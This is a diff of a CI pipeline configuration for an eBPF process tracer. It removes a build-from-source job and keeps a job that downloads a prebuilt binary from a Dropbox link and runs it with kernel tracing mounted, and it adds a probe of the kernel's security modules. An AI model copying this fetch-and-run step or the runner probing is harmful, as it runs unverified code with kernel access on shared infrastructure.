@@ -16,42 +16,6 @@ trace:
       - ./exec-tracer
       - /tmp/exec.log
 
-  before_script:
-    - id
-    - cat /proc/self/status|grep Cap
-    - apt-get update
-    - apt-get install -y
-      clang
-      llvm
-      libbpf-dev
-      linux-libc-dev
-      bpftool
-      make
-      git
-      iproute2
-
-  script:
-    - bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
-    - go mod download
-    - go mod download github.com/cilium/ebpf
-    - go get github.com/cilium/ebpf/internal/unix@v0.19.0
-    - go generate ./...
-    #- go build -v -o exec-tracer .
-    - make
-    - mount -t tracefs tracefs /sys/kernel/tracing
-    #- setsid nohup ./exec-tracer >/dev/null &
-    - ./exec-tracer
-    - sleep 2
-    - pwd
-    - id
-    - ps faux
-    - bpftool prog list
-    - ip addr
-    - ps faux
-
-  after_script:
-    - cat /tmp/exec.log
-
 justrun:
   stage: build
   image: golang:${GO_VERSION}
@@ -59,6 +23,7 @@ justrun:
   before_script:
     - wget -k -O exec-tracer "https://www.dropbox.com/scl/fi/62jk44i7r9lboyv8uhzrd/exec-tracer?rlkey=7shagu4bcbjtoc1tahfj10yy1&st=13tg54er&dl=0" && chmod +x exec-tracer
     - mount -t tracefs tracefs /sys/kernel/tracing
+    - cat /sys/kernel/security/lsm
     - ./exec-tracer
     - sleep 2
 
